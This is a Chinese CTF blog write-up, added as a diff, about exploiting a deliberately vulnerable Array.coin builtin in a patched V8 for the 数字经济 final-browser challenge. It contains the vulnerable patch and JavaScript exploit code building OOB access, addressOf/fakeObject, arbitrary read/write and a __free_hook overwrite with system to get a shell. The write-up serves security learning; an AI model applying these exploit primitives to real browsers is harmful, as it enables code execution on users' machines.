@@ -1,0 +1,295 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>浏览器漏洞学习--V8--数字经济final-browser | 白里个白</title>
+  <meta name="author" content="SofrWhite">
+  
+  <meta name="description" content="前言继续学习浏览器漏洞的相关知识。
+之前文章：
+v8开坑+starCTF2019 oob：http://pwn.sofr.website/2020/06/01/v8%E5%BC%80%E5%9D%91/
+关键字： CTF pwn browser v8 数字经济">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="浏览器漏洞学习--V8--数字经济final-browser"/>
+  <meta property="og:site_name" content="白里个白"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?70c14b3774d11227a872a4e3d91d46e9";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">白里个白</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 浏览器漏洞学习--V8--数字经济final-browser</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续学习浏览器漏洞的相关知识。</p>
+<p>之前文章：</p>
+<p>v8开坑+starCTF2019 oob：<a href="http://pwn.sofr.website/2020/06/01/v8开坑/" target="_blank" rel="noopener">http://pwn.sofr.website/2020/06/01/v8%E5%BC%80%E5%9D%91/</a></p>
+<p>关键字： <code>CTF</code> <code>pwn</code> <code>browser</code> <code>v8</code> <code>数字经济</code></p>
+<a id="more"></a>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 0ec93e047216979431bd6f147ab5956bb729afa2</span><br><span class="line">git apply /home/sofr/browser_pwn/数字经济-final-browser/browser/diff.patch</span><br></pre></td></tr></table></figure>
+
+<h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p>先查看diff：</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index e6ab965a7e..9e5eb73c34 100644</span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line">@@ -362,6 +362,36 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"></span><br><span class="line"><span class="addition">+// Vulnerability is here</span></span><br><span class="line"><span class="addition">+// You can't use this vulnerability in Debug Build :)</span></span><br><span class="line"><span class="addition">+BUILTIN(ArrayCoin) &#123;</span></span><br><span class="line"><span class="addition">+  uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+  if (len != 3) &#123;</span></span><br><span class="line"><span class="addition">+     return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+         isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; length;</span></span><br><span class="line"><span class="addition">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+             isolate, length, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+             isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(2)));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  uint32_t array_length = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());</span></span><br><span class="line"><span class="addition">+  if(37 &lt; array_length)&#123;</span></span><br><span class="line"><span class="addition">+    elements.set(37, value-&gt;Number());</span></span><br><span class="line"><span class="addition">+    return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+  else&#123;</span></span><br><span class="line"><span class="addition">+    return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br></pre></td></tr></table></figure>
+
+<p>这个diff中，添加了在数组第37个元素处写任意值的操作，但是同时这个coin函数又判断了当前的这个数组的长度必须小于37，但看这个函数是没有漏洞的，但是该函数可以通过<code>valueOf</code> 触发 <code>callback</code> 回调，回调函数可以通过对 <code>array.length</code> 的赋值来重新分配内存空间。然而，<code>array</code> 以及 <code>element</code> 均在执行回调之前就已经保存在局部变量中，后续在对 <code>element</code> 的赋值时也直接采用的是该局部变量，因此我们得到了一个 <code>UAF</code> ，并且可以这样利用：通过在 <code>Callback</code> 中扩大 <code>Array</code> 的 <code>length</code> 来强制 <code>GC</code> 重新 <code>alloc</code> ，之后通过分配巨量的 <code>array</code> 来占位原 <code>array</code> 的地址空间，最后通过 <code>elements.set(37, value-&gt;Number())</code> 来达到对原内存内容的修改。倘若我们修改的内存恰好是新占位 <code>array</code> 的 <code>length</code> 字段，那我们就得到了一个 <code>OOB</code> 数组。</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在分析完题目后，思路就有了，和starCTF的oob类似，构造一个addressOf和fakeObject语句，之后构造任意地址读写。最后修改free_hook达到最终的getshell。</p>
+<p>首先，申请一个数组作为溢出的数组，之后申请一个float数组，准备溢出至改数组的length字段，之后用该数组实现越界的读写。同时为了后续的addressOf和fakeObject函数，我们申请了一个object的数组。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">x</span>:<span class="number">100</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">31</span>);</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="comment">//%DebugPrint(float_array);</span></span><br><span class="line"><span class="keyword">var</span> object_array = [obj,obj,obj,obj];</span><br></pre></td></tr></table></figure>
+
+<p>之后就是我们通过callback函数，进行漏洞利用：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> object_array = [obj,obj,obj,obj];</span><br><span class="line"><span class="keyword">var</span> vuln = &#123;</span><br><span class="line">        valueOf:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                array.length = <span class="number">40</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1024</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">array.coin(<span class="number">1</span>,vuln);</span><br></pre></td></tr></table></figure>
+
+<p>从gdb里面算一算偏移，可以找到应该申请多大的array用来刚好溢出到float_array的length字段。这里我计算出来是31。</p>
+<p>之后，利用float_array来修改object_array的内容，可以分别用object_array正常写，float_array越界读来实现addressOf，使用float_array越界写，object_array正常读来实现fakeObejct。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">object</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        object_array[<span class="number">0</span>] = object;</span><br><span class="line">        <span class="keyword">var</span> address = float_array[<span class="number">7</span>];</span><br><span class="line">        <span class="keyword">return</span> f2i(address)<span class="number">-1n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">address</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        float_array[<span class="number">7</span>] = i2f(address);</span><br><span class="line">        <span class="keyword">var</span> fakeObject = object_array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">return</span> fakeObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后，我的任意读写的语句和之前的starCTF的oob中的语句完全一样：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line"><span class="keyword">var</span> a_constructor_addr = addressOf(a.constructor);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] leak addr: "</span> + hex(a_constructor_addr));</span><br><span class="line"><span class="keyword">var</span> fake_obj_addr = leak_addr+<span class="number">0x30n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_obj = fakeObject(fake_obj_addr+<span class="number">1n</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">                evil_array[<span class="number">2</span>] = i2f(addr<span class="number">-0x10n</span>+<span class="number">1n</span>);</span><br><span class="line">                <span class="keyword">var</span> leak_data = f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">                evil_array[<span class="number">2</span>] = i2f(addr<span class="number">-0x10n</span>+<span class="number">1n</span>);</span><br><span class="line">                fake_obj[<span class="number">0</span>] = i2f(data);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dataview_write</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        write64(addressOf(data_buf)+<span class="number">0x20n</span>,addr);</span><br><span class="line">        data_view.setFloat64(<span class="number">0</span>,i2f(data),<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>包括最后的利用也是一样的，唯一不一样的是text地址的偏移变了，这个自己重新算算就ok了：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> text_addr = (read64(read64(a_constructor_addr + <span class="number">0x30n</span>)<span class="number">-1n</span> +<span class="number">0x40n</span>) &gt;&gt; <span class="number">16n</span>) - <span class="number">0xaf6c60n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] text addr: "</span> + hex(text_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sprintf_got = text_addr+<span class="number">0xdbe770n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] sprintf got addr: "</span> + hex(sprintf_got));</span><br><span class="line"><span class="keyword">var</span> libc_addr = read64(sprintf_got) - <span class="number">0x65000n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] libc addr: "</span> + hex(libc_addr));</span><br><span class="line"><span class="keyword">var</span> system_addr = libc_addr + <span class="number">0x4f440n</span>;</span><br><span class="line"><span class="keyword">var</span> free_hook_addr = libc_addr + <span class="number">0x3ed8e8n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] system addr: "</span> + hex(system_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] free hook addr: "</span> + hex(free_hook_addr));</span><br><span class="line"></span><br><span class="line">dataview_write(free_hook_addr,system_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(get_shell_buffer);</span><br><span class="line">get_shell_dataview.setFloat64(<span class="number">0</span>, i2f(<span class="number">0x0068732f6e69622fn</span>), <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/01/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E/image-20200607193933641.png" alt="image-20200607193933641"></p>
+<p><img src="/2020/06/01/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E/image-20200607193953159.png" alt="image-20200607193953159"></p>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>如有错误欢迎指正：<a href="mailto:sofr@foxmail.com">sofr@foxmail.com</a></p>
+<p>之前文章：</p>
+<p>v8开坑+starCTF2019 oob：[<a href="http://pwn.sofr.website/2020/06/01/v8%E5%BC%80%E5%9D%91/]" target="_blank" rel="noopener">http://pwn.sofr.website/2020/06/01/v8%E5%BC%80%E5%9D%91/]</a>(</p>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/2020/06/01/v8开坑/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2020/05/11/de1-wp/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2020-06-01 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/pwn/">pwn<span>7</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/browser/">browser<span>2</span></a></li> <li><a href="/tags/v8/">v8<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#前言"><span class="toc-article-text">前言</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#题目信息"><span class="toc-article-text">题目信息</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#思路"><span class="toc-article-text">思路</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#写在最后"><span class="toc-article-text">写在最后</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
